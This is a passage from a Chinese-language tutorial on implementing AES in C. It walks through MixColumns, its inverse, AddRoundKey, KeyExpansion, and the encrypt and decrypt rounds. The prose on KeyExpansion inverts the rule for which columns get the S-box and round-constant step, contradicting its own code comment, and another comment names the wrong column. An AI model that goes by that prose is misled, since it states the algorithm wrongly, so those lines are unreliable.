tmp[4][MAXBC]; int i, j; for (j = 0; j &lt; Nb; ++j) for (i = 0; i &lt; 4; i++) tmp[i][j] = mul(2, state[i][j]) ^ mul(3, state[(i + 1) % 4][j]) ^ state[(i + 2) % 4][j] ^ state[(i + 3) % 4][j]; for (i = 0; i &lt; 4; i++) for (j = 0; j &lt; Nb; j++) state[i][j] = tmp[i][j];}word8 mul (word8 a, word8 b) { if (a &amp;&amp; b) return Alogtable[(Logtable[a] + Logtable[b]) % 255]; else return 0;}MixColumns的逆过程InvMixColumns的实现仅所乘矩阵不同，其他操作相同，代码如下：void InvMixColumns(word8 state[4][MAXBC]) { int i, j; word8 tmp[4][MAXBC]; for (j = 0; j &lt; Nb; j++) for (i = 0; i &lt; 4; i++) tmp[i][j] = mul(0xe, state[i][j]) ^ mul(0xb, state[(i + 1) % 4][j]) ^ mul(0xd, state[(i + 2) % 4][j]) ^ mul(0x9, state[(i + 3) % 4][j]); for (i = 0; i &lt; 4; i++) for (j = 0; j &lt; Nb; j++) state[i][j] = tmp[i][j];}4. KeyAdditionstate与ExpandedKey[i]对应项相异或，代码如下：void AddRoundKey(word8 state[4][MAXBC], word8 rk[4][MAXBC]) { int i, j; for (i = 0; i &lt; 4; ++i) for (j = 0; j &lt; Nb; j++) state[i][j] ^= rk[i][j];}5.KeyExpansionKeyExpansion是AES中代码最复杂的一部分，扩展密钥ExpandedKey的规模由Nb和Nk确定，ExpandedKey定义为MAXROUNDS+1 * 4 * MAXBC的三维矩阵。那么在第i轮轮密钥加时，ExpandedKey[i]就是需要需要使用的4 * MAXBC的扩展密钥矩阵。扩展密钥的前Nk列由输入密钥直接填充，而第i列的密钥分为两种情况： 如果i是Nk的倍数，那么第i列是第i - Nk列与i - 1列的按位异或 如果不是，那么第i列是第i - Nk列与i - 1列的非线性函数的按位异或，这个非线性函数是S盒+一个循环常量。 特殊情况：如果Nk &gt;= 6，那么当i % Nk ==4 时，与上面第二种情况相同。在计算轮密钥时，按照每块为4 * Nk列来计算，在进行轮密钥加时，按照每块4 * Nb列来划分。代码及注释如下：int KeyExpansion(word8 key[4][MAXKC], word8 ExpandedKey[MAXROUNDS + 1][4][MAXBC]) { int i, j, t, RCpointer = 1; word8 tk[4][MAXKC]; /* * the first Nk columns are filled with the cipher key. */ for (j = 0; j &lt; Nk; j++) for (i = 0; i &lt; 4; i++) tk[i][j] = key[i][j]; t = 0; /* copy values into round key array*/ for (j = 0; (j &lt; Nk) &amp;&amp; (t &lt; (ROUNDS + 1) * Nb); j++, t++) for (i = 0; i &lt; 4; i++) ExpandedKey[t / Nb][i][t % Nb] = tk[i][j]; /* * tk中存放的是column i - 1的密钥 * 如果i不是Nk的倍数，那么第i列是第i - Nk列和第 i - 1列的按位异或， 否则第i列是第i - Nk和第 i - 1列的非线性函数的按列异或 */ while (t &lt; (ROUNDS + 1) * Nb) { // tk 4 * Nk的矩阵 每一列与他的后一列异或， /* * 第 0 列 与 i - 1列的S盒置换异或 */ for (i = 0; i &lt; 4; i++) tk[i][0] ^= S[tk[(i + 1) % 4][Nk - 1]]; tk[0][0] ^=RC[RCpointer++]; /* * 当KC &lt;= 6时， 只有第0列是Nk的倍数，剩余的第1 到KC-1列只需要与第j - 1列异或 * 当KC &gt; 6时， 第 0 列和第3列需要与S盒进行异或，其他的需要与j-1列进行异或 * Nk = keylength / 32, Nb = blocklength/32 * 计算轮密钥时，按照Nk * 4来计算，划分时按照每组4 * Nb依次存放 */ if (Nk &lt;= 6) for (j = 1; j &lt; Nk; j++) for (i = 0; i &lt; 4; i++) tk[i][j] ^= tk[i][j - 1]; else { for(j = 1; j &lt; 4; j++) for (i = 0; i &lt; 4; i++) tk[i][j] ^= tk[i][j - 1]; for(i = 0; i &lt; 4; i++) tk[i][4] ^= S[tk[i][3]]; for(j = 5; j &lt; Nk; j++) for(i = 0; i &lt; 4; i++) tk[i][j] ^= tk[i][j - 1]; } /* copy values into round key array */ for (j = 0; (j &lt; Nk) &amp;&amp; (t &lt; (ROUNDS + 1) * Nb); j++, t++) for (i = 0; i &lt; 4; i++) ExpandedKey[t / Nb][i][t % Nb] = tk[i][j]; } return 0;}#### 6. Encrypt &amp; Decrypt加密即为上述几种基本操作的组合，Decrypt为几种逆运算的组合，代码如下:int Encrypt(word8 state[4][MAXBC], word8 rk[MAXROUNDS + 1][4][MAXBC]) { /* * Encryption of one block */ int r; /* key addition */ AddRoundKey(state, rk[0]); for (r = 1; r &lt; ROUNDS; r++) { SubBytes(state, S); ShiftRows(state, 0); MixColumns(state); AddRoundKey(state, rk[r]); } /* * final round don't have MixColumns */ SubBytes(state, S); ShiftRows(state, 0); AddRoundKey(state, rk[ROUNDS]); return 0;}int Decrypt(word8 state[4][MAXBC], word8 rk[MAXROUNDS + 1][4][MAXBC]) { int r; AddRoundKey(state, rk[ROUNDS]); SubBytes(state, Si); ShiftRows(state, 1); for (r = ROUNDS-1; r &gt; 0; r--) { AddRoundKey(state, rk[r]); InvMixColumns(state); SubBytes(state, Si); ShiftRows(state, 1); } AddRoundKey(state, rk[0]); return 0;}" } ]
